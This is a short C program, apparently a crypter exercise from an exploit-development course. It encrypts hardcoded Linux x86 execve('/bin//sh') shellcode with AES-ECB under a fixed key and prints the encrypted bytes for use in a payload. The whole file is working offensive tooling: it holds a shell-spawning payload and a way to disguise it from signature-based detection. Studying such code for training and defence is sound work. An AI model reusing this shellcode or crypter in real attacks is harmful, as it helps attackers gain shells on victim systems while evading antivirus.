#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include "aes.h"

#define SHELLCODELENGTH 32

static void phex(uint8_t* str);

int main(void)
{	
    uint8_t i;

    uint8_t key[16] =        { (uint8_t) 0x73, (uint8_t) 0x65, (uint8_t) 0x63, (uint8_t) 0x75, (uint8_t) 0x72, (uint8_t) 0x69, (uint8_t) 0x74, (uint8_t) 0x79, (uint8_t) 0x74, (uint8_t) 0x75, (uint8_t) 0x62, (uint8_t) 0x65, (uint8_t) 0x53, (uint8_t) 0x4c, (uint8_t) 0x41, (uint8_t) 0x45 };

    uint8_t shellcode[SHELLCODELENGTH] = { (uint8_t) 0x31, (uint8_t) 0xc0, (uint8_t) 0x50, (uint8_t) 0x68, (uint8_t) 0x2f, (uint8_t) 0x2f, (uint8_t) 0x73, (uint8_t) 0x68, (uint8_t) 0x68, (uint8_t) 0x2f, (uint8_t) 0x62, (uint8_t) 0x69, (uint8_t) 0x6e, (uint8_t) 0x89, (uint8_t) 0xe3, (uint8_t) 0x50, (uint8_t) 0x89, (uint8_t) 0xe2, (uint8_t) 0x53, (uint8_t) 0x89, (uint8_t) 0xe1, (uint8_t) 0xb0, (uint8_t) 0x0b, (uint8_t) 0xcd, (uint8_t) 0x80, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90 };

    printf("Encoded shellcode:\n");
    
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);

    for (i = 0; i < SHELLCODELENGTH / 16; ++i)
    {
      AES_ECB_encrypt(&ctx, shellcode + (i * 16));
      phex(shellcode + (i * 16));
    }

    return 0;
}

// prints string as hex
static void phex(uint8_t* str)
{
    unsigned char i;
    for (i = 0; i < 16; ++i)
        printf("(uint8_t) 0x%.2x, ", str[i]);
    printf("\n");
}
